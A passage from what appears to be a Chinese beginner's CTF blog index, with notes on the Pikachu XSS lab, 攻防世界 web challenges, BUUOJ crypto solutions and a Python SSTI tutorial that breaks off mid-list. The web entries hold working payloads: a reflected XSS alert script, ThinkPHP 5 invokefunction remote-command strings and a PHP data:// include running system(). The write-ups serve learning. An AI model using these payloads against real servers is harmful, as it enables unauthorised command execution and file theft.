class="line"><span class="comment">//全局设置默认字符</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="comment">//定义数据库连接参数</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DBHOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>);<span class="comment">//将localhost修改为数据库服务器的地址</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DBUSER&#x27;</span>, <span class="string">&#x27;pkxss&#x27;</span>);<span class="comment">//将root修改为连接mysql的用户名</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DBPW&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>);<span class="comment">//将root修改为连接mysql的密码</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DBNAME&#x27;</span>, <span class="string">&#x27;pkxss&#x27;</span>);<span class="comment">//自定义，建议不修改</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DBPORT&#x27;</span>, <span class="string">&#x27;3306&#x27;</span>);<span class="comment">//将3306修改为mysql的连接端口，默认tcp3306</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后新建一个数据库就欧克了。这个xss后台也没啥意思，<del>可能是我太菜了，呜呜呜</del></p></li></ul><p><strong>至此，pikachu渗透环境配置完成</strong></p><h1 id="开始做题"><a href="#开始做题" class="headerlink" title="开始做题"></a>开始做题</h1><h2 id="3-Cross-Site-Scripting-xss跨站脚本攻击"><a href="#3-Cross-Site-Scripting-xss跨站脚本攻击" class="headerlink" title="3.Cross-Site Scripting (xss跨站脚本攻击)"></a>3.Cross-Site Scripting (xss跨站脚本攻击)</h2><p><strong>对一切都不了解，太菜了，菜死了</strong></p><h3 id="0-总介绍"><a href="#0-总介绍" class="headerlink" title="0.总介绍"></a>0.总介绍</h3><p>下面是Pikachu上面给出的关于xss的介绍如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">XSS（跨站脚本）概述</span><br><span class="line">Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写&quot;CSS&quot;冲突，故又称XSS。一般XSS可以分为如下几种常见类型：</span><br><span class="line">    1.反射性XSS;</span><br><span class="line">    2.存储型XSS;</span><br><span class="line">    3.DOM型XSS;</span><br><span class="line"></span><br><span class="line">XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。</span><br><span class="line">XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。</span><br><span class="line">形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。</span><br><span class="line">因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理:</span><br><span class="line">  输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;</span><br><span class="line">  输出转义：根据输出点的位置对输出到前端的内容进行适当转义;</span><br><span class="line"></span><br><span class="line">你可以通过“Cross-Site Scripting”对应的测试栏目，来进一步的了解该漏洞。</span><br></pre></td></tr></table></figure><h3 id="1-反射型xss"><a href="#1-反射型xss" class="headerlink" title="1.反射型xss"></a>1.反射型xss</h3><h4 id="0-攻击介绍"><a href="#0-攻击介绍" class="headerlink" title="0.攻击介绍"></a>0.攻击介绍</h4><p>只能进行一次攻击，我们的恶意代码不会被存储的这种应该叫反射型xss吧。</p><h4 id="1-方法与流程"><a href="#1-方法与流程" class="headerlink" title="1.方法与流程"></a>1.方法与流程</h4><p>如果我们在输入框里面填入<code>&lt;script&gt;&lt;/script&gt;</code>则什么都不会回显，直接插入到我们的html里面了，然后可以可以知道输入内容有长度限制，这里直接F12大法，就能alert(xss)了</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(xss)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>直接在url里面传入参数也行，然后直接提交就能弹出窗口啦</p><p><del>先睡了，明天还有课，死</del></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 练习靶场 </tag>
            
            <tag> 初学者 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ADWord_web进阶</title>
      <link href="/2020/11/25/ADWord-web%E8%BF%9B%E9%98%B6/"/>
      <url>/2020/11/25/ADWord-web%E8%BF%9B%E9%98%B6/</url>
      
        <content type="html"><![CDATA[<p><strong>攻防世界web进阶区做题记录</strong></p><h1 id="003-php-rce"><a href="#003-php-rce" class="headerlink" title="003.php rce"></a>003.php rce</h1><p><a href="https://www.cnblogs.com/backlion/p/10106676.html">TP5有漏洞</a><br>任意命令执行RCE</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br><span class="line">?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls /</span><br><span class="line">?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /flag</span><br></pre></td></tr></table></figure><h1 id="004-Web-php-include"><a href="#004-Web-php-include" class="headerlink" title="004.Web_php_include"></a>004.Web_php_include</h1><p>方法很多，这里用data伪协议</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain,&lt;?php system(&quot;ls&quot;)?&gt;</span><br><span class="line">或</span><br><span class="line">data://text/plain/;base64,PD9waHAgc3lzdGVtKCJscyIpPz4=</span><br><span class="line"></span><br><span class="line">fl4gisisish3r3.php index.php phpinfo.php</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain,&lt;?php system(&quot;tac fl4gisisish3r3.php&quot;)?&gt;</span><br></pre></td></tr></table></figure><h1 id="005"><a href="#005" class="headerlink" title="005."></a>005.</h1>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUOJ_crypto</title>
      <link href="/2020/11/25/BUUOJ-crypto/"/>
      <url>/2020/11/25/BUUOJ-crypto/</url>
      
        <content type="html"><![CDATA[<p><strong>偶尔会做些crypto的题目，往后就把解题过程放在这一个文件里了</strong></p><h2 id="1-小学生的密码学"><a href="#1-小学生的密码学" class="headerlink" title="1.小学生的密码学"></a>1.小学生的密码学</h2><p>仿射密码解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#@author:M4xlmum</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">表达式:e(x)=11x+6(mod26)</span></span><br><span class="line"><span class="string">密文：welcylk</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="comment">#再用到时改下参数即可</span></span><br><span class="line">a = <span class="number">11</span></span><br><span class="line">b = <span class="number">6</span></span><br><span class="line"></span><br><span class="line">mul = <span class="number">0</span></span><br><span class="line"><span class="comment">#求乘法逆元</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">26</span>):</span><br><span class="line">    <span class="keyword">if</span> (i * a) % <span class="number">26</span> == <span class="number">1</span>:</span><br><span class="line">        mul = i</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#求加法逆元</span></span><br><span class="line">add = <span class="number">26</span> - b</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;乘法逆元为:&quot;</span>, mul)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;加法逆元为:&quot;</span>, add)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">解密算法即为:d(x) = (x + add) * mul</span></span><br><span class="line"><span class="string">d(x) = (x+20) * 19</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">m = <span class="string">&quot;welcylk&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(((<span class="built_in">ord</span>(i)-<span class="number">97</span>+<span class="number">20</span>)*<span class="number">19</span>)%<span class="number">26</span>+<span class="number">97</span>), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n仿射解密完成&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>sorcery</code><br><code>flag&#123;c29yY2VyeQ==&#125;</code></p><h1 id="2-BJDCTF-2nd-Y1nglish-y1ng"><a href="#2-BJDCTF-2nd-Y1nglish-y1ng" class="headerlink" title="2.[BJDCTF 2nd]Y1nglish-y1ng"></a>2.[BJDCTF 2nd]Y1nglish-y1ng</h1><blockquote><p>给了个文本，这种就是字母硬替换（随即替换，没有一点规律），一般情况下，除非给出密码表，否则很难解密。但是好在还是有方法，因为英文字母的出现次数的多或少，可以按照字频解密，这里用一个在线网站解密<br><a href="https://quipqiup.com/">quipquip</a><br><img src="/2020/11/25/BUUOJ-crypto//1.png"><br><code>BJD &#123;pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4cy&#125;</code>、<code>flag&#123;pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4cy&#125;</code>，*_*，<code>flag&#123;pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4ck&#125;</code></p></blockquote><h1 id="3-世上无难事"><a href="#3-世上无难事" class="headerlink" title="3.世上无难事"></a>3.世上无难事</h1><p>汉字的秘密，当铺密码&lt;<code>原理即将汉字出头的头的个数转化为数字，如&lt;王:6,由:1,壮:9...等等&gt;，转为数字</code>&gt;，转为数字之后发现没超过127的和少于32的，所以转为ascii，然后得到<code>EJ&gt;CvSHMV7G9R9@?3k</code>，变异凯撒，用脚本解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#@m4xlmum</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">list1 = [<span class="number">69</span>, <span class="number">74</span>, <span class="number">62</span>, <span class="number">67</span>, <span class="number">118</span>, <span class="number">83</span>, <span class="number">72</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">55</span>, <span class="number">71</span>, <span class="number">57</span>, <span class="number">82</span>, <span class="number">57</span>, <span class="number">64</span>, <span class="number">63</span>, <span class="number">51</span>, <span class="number">107</span>]</span><br><span class="line">list2 =[]</span><br><span class="line"></span><br><span class="line">f = <span class="number">0</span></span><br><span class="line"><span class="comment">#变异凯撒</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list1:</span><br><span class="line">    f += <span class="number">1</span></span><br><span class="line">    list2.append(<span class="built_in">chr</span>(i+f))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i+f), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="comment">#转为小写</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list2:</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">in</span> string.ascii_uppercase:</span><br><span class="line">        i = <span class="built_in">str</span>.lower(i)</span><br><span class="line">    <span class="built_in">print</span>(i, end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>FLAG&#123;YOU_ARE_GOOD&#125;</code>、<code>flag&#123;you_are_good&#125;</code></p><h1 id="4-世上无难事"><a href="#4-世上无难事" class="headerlink" title="4.世上无难事"></a>4.世上无难事</h1><p>词频分析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HELLO EVERYBODY THANK YOU ALL RIGHT EVERYBODY GO AHEAD AND HAVE A SEAT HOW IS EVERYBODY DOING TODAY HOW ABOUT TIM SPICER WE ARE HERE WITH STUDENTS AT WAKEFIELD HIGH SCHOOL IN ARLINGTON VIRGINIA AND WE HAVE GOT STUDENTS TUNING IN FROM ALL ACROSS AMERICA FROM KINDERGARTEN THROUGH 12TH GRADE AND WE ARE JUST SO GLAD THAT ALL COULD JOIN US TODAY AND WE WANT TO THANK WAKEFIELD FOR BEING SUCH AN OUTSTANDING HOST GIVE YOURSELVES A BIG ROUND OF APPLAUSE AND THE KEY IS 640E11012805F211B0AB24FF02A1ED09</span><br></pre></td></tr></table></figure><p><code>640E11012805F211B0AB24FF02A1ED09</code>题目说要小写，转换<code>flag&#123;640e11012805f211b0ab24ff02a1ed09&#125;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">data = <span class="built_in">input</span>(<span class="string">&quot;请输入大写:&quot;</span>)</span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">in</span> string.ascii_uppercase:</span><br><span class="line">        res += <span class="built_in">str</span>.lower(i)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res += i</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><h1 id="5-异性相吸"><a href="#5-异性相吸" class="headerlink" title="5.异性相吸"></a>5.异性相吸</h1><p>文件异或，看属性都是38个字节，就把文件内容按位异或取结果，脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">mfile = <span class="built_in">open</span>(<span class="string">r&quot;C:\Users\Administrator\Desktop\ctf题目\buuoh\crypto\异性相吸\mfile.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">key = <span class="built_in">open</span>(<span class="string">r&quot;C:\Users\Administrator\Desktop\ctf题目\buuoh\crypto\异性相吸\key.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(mfile[i] ^ key[i])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p><code>flag&#123;ea1bc0988992276b7f95b54a7435e89e&#125;</code></p><h1 id="6-还原大师"><a href="#6-还原大师" class="headerlink" title="6.还原大师"></a>6.还原大师</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们得到了一串神秘字符串：TASC?O3RJMV?WDJKX?ZM,问号部分是未知大写字母，为了确定这个神秘字符串，我们通过了其他途径获得了这个字串的32位MD5码。但是我们获得它的32位MD5码也是残缺不全，E903???4DAB????08?????51?80??8A?,请猜出神秘字符串的原本模样，并且提交这个字串的32位MD5码作为答案。</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">data = <span class="string">&quot;TASC&#123;&#125;O3RJMV&#123;&#125;WDJKX&#123;&#125;ZM&quot;</span></span><br><span class="line"></span><br><span class="line">brute_upper = string.ascii_uppercase</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> brute_upper:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> brute_upper:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> brute_upper:</span><br><span class="line">            tmp = hashlib.md5(data.<span class="built_in">format</span>(i, j, k).encode(<span class="string">&quot;UTF-8&quot;</span>)).hexdigest().upper()</span><br><span class="line">            <span class="keyword">if</span> tmp[:<span class="number">4</span>] == <span class="string">&quot;E903&quot;</span>:</span><br><span class="line">                <span class="built_in">print</span>(data.<span class="built_in">format</span>(i, j, k))</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;res=&quot;</span>, tmp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#TASCJO3RJMVKWDJKXLZM</span></span><br><span class="line"><span class="comment">#res=E9032994DABAC08080091151380478A2</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">print(hashlib.md5(data.encode(&quot;UTF-8&quot;)).hexdigest().upper())</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><code>flag&#123;E9032994DABAC08080091151380478A2&#125;</code></p><h1 id="7-robomunication"><a href="#7-robomunication" class="headerlink" title="7.robomunication"></a>7.robomunication</h1><p>音乐片段，准备用python分析下音频<br><del>明天</del><br>不难先空着呜呜我太菜了。</p><h1 id="8-RSAROLL"><a href="#8-RSAROLL" class="headerlink" title="8.RSAROLL"></a>8.RSAROLL</h1><p>给了n、e分别为<code>&#123;920139713,19&#125;</code><br>然后下面是数据(密文)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">704796792</span><br><span class="line">752211152</span><br><span class="line">274704164</span><br><span class="line">18414022</span><br><span class="line">368270835</span><br><span class="line">483295235</span><br><span class="line">263072905</span><br><span class="line">459788476</span><br><span class="line">483295235</span><br><span class="line">459788476</span><br><span class="line">663551792</span><br><span class="line">475206804</span><br><span class="line">459788476</span><br><span class="line">428313374</span><br><span class="line">475206804</span><br><span class="line">459788476</span><br><span class="line">425392137</span><br><span class="line">704796792</span><br><span class="line">458265677</span><br><span class="line">341524652</span><br><span class="line">483295235</span><br><span class="line">534149509</span><br><span class="line">425392137</span><br><span class="line">428313374</span><br><span class="line">425392137</span><br><span class="line">341524652</span><br><span class="line">458265677</span><br><span class="line">263072905</span><br><span class="line">483295235</span><br><span class="line">828509797</span><br><span class="line">341524652</span><br><span class="line">425392137</span><br><span class="line">475206804</span><br><span class="line">428313374</span><br><span class="line">483295235</span><br><span class="line">475206804</span><br><span class="line">459788476</span><br><span class="line">306220148</span><br></pre></td></tr></table></figure><p>解出p、q，<code>&#123;920139713 = 18443 * 49891&#125;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#-----------------------------------------------------.</span></span><br><span class="line"><span class="comment"># @Author  : M4XLMUM                                  |</span></span><br><span class="line"><span class="comment"># @website : http://a16n.github.io or http://a16ne.cn |</span></span><br><span class="line"><span class="comment">#-----------------------------------------------------.</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p = <span class="number">18443</span> </span><br><span class="line">q = <span class="number">49891</span></span><br><span class="line">e = <span class="number">19</span></span><br><span class="line">n = <span class="number">920139713</span></span><br><span class="line"></span><br><span class="line">phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line"></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">r&#x27;C:\Users\Administrator\Desktop\ctf题目\buuoj\crypto\RSAROLL\RsaRoll\data.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">lines = file.readlines()</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines[<span class="number">2</span>:]:</span><br><span class="line">    m = <span class="built_in">int</span>(line.strip())</span><br><span class="line">    c = <span class="built_in">pow</span>(m, d, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(c), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>flag&#123;13212je2ue28fy71w8u87y31r78eu1e2&#125;</code></p><h1 id="9-Cipher"><a href="#9-Cipher" class="headerlink" title="9.Cipher"></a>9.Cipher</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">还能提示什么呢？公平的玩吧（密钥自己找） Dncnoqqfliqrpgeklwmppu</span><br></pre></td></tr></table></figure><p><code>普莱费尔(playfair)密码</code>，密码表类似为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p l a y f</span><br><span class="line">i r b c d</span><br><span class="line">e g h k m</span><br><span class="line">n o q s t</span><br><span class="line">u v w x z</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/qq_45784859/article/details/105766145">看大佬的解析吧，懒得看了</a><br><a href="http://rumkin.com/tools/cipher/playfair.php">在线解playfair</a><br>解密为<code>Itisnotaproblemhavefun</code><br><code>flag&#123;itisnotaproblemhavefun&#125;</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python_ssti</title>
      <link href="/2020/11/24/python-ssti/"/>
      <url>/2020/11/24/python-ssti/</url>
      
        <content type="html"><![CDATA[<h2 id="1-python2使用ssti读文件"><a href="#1-python2使用ssti读文件" class="headerlink" title="1.python2使用ssti读文件"></a>1.python2使用ssti读文件</h2><p>从主类里面找到<code>file</code>类，借助该类里面的方法读取文件，首先得知道<code>file</code>的位置(编号)。</p><h3 id="1-列举python内建类"><a href="#1-列举python内建类" class="headerlink" title="1.列举python内建类"></a>1.列举python内建类</h3><p>python2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()): <span class="built_in">print</span> i</span><br></pre></td></tr></table></figure><p>下面是列举出来的python的内建函数及其对应的编号</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">0</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;type&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">1</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakref&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">2</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakcallableproxy&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">3</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakproxy&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">4</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;int&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">5</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;basestring&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">6</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;bytearray&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">7</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;list&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">8</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;NoneType&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">9</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;NotImplementedType&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">10</span>, &lt;<span class="built_in">type</span> <span 